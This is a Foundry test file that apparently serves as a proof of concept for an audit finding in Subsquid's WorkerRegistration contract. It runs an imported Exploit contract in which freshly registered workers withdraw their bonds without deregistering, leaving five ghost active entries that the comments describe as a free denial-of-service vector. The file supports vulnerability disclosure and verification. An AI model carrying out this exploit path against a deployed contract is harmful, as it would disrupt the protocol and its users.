// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, WorkerRegistration, MiniToken, GhostMarker} from "./58247-h-03-workers-could-withdraw-without-deregister-and-waiting-f.sol";

// Subsquid H-03 (finding 58247): WorkerRegistration.withdraw only enforces
// `block.number >= worker.deregisteredAt + lockPeriod()`. A just-registered
// (not-yet-active) worker whose deregisteredAt is still 0 satisfies this
// trivially, so it withdraws its bond immediately WITHOUT deregistering and
// WITHOUT serving the lock period — and is never removed from activeWorkerIds,
// leaving dangling ghost entries (unbounded-loop / DoS vector) at zero net cost.
contract Finding58247Test is Test {
    address internal constant SINK = address(0xD00d);

    function test_exploit_immediateWithdraw_leavesGhostActiveWorkers() public {
        // realistic block height (finding's own PoC rolls to 176329477) so the
        // degenerate lock check `block.number >= 0 + lockPeriod()` passes.
        vm.roll(176329477);

        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("net token cost to attacker (wei)", e.tokenCostToAttacker());
        emit log_named_uint("ghost entries left in activeWorkerIds", e.ghostEntries());
        emit log_named_uint("phantom active bond minted to SINK (wei)", e.phantomActiveBond());

        // attacker recovered every bond -> the DoS was planted for free.
        assertEq(e.tokenCostToAttacker(), 0, "attacker should have zero net cost");

        // all 5 workers withdrawn/deleted, yet all 5 still dangle as "active".
        assertEq(e.ghostEntries(), 5, "5 ghost entries must remain in activeWorkerIds");
        assertEq(e.vuln().activeWorkerCount(), 5, "active list not cleaned up");

        // harm magnitude recorded on the SINK marker.
        assertEq(e.phantomActiveBond(), 5 * 100_000 ether, "phantom active bond");
        assertEq(e.marker().balanceOf(SINK), 5 * 100_000 ether, "harm not minted to SINK");
    }
}
